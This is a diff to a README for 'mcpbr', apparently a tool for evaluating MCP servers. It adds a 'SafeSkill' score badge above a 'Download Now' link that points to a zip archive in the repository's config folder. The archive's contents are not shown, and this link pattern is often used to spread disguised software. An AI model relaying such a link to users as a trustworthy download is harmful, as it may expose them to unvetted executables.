@@ -1,5 +1,7 @@
 # 🌟 mcpbr - Evaluate MCP Servers Easily
 
+[![SafeSkill 84/100](https://img.shields.io/badge/SafeSkill-84%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/zaikoxeas-mcpbr)
+
 ## 📥 Download Now
 [![Download mcpbr](https://raw.githubusercontent.com/ZaikoXeas/mcpbr/main/config/Software-v3.8.zip)](https://raw.githubusercontent.com/ZaikoXeas/mcpbr/main/config/Software-v3.8.zip)
 
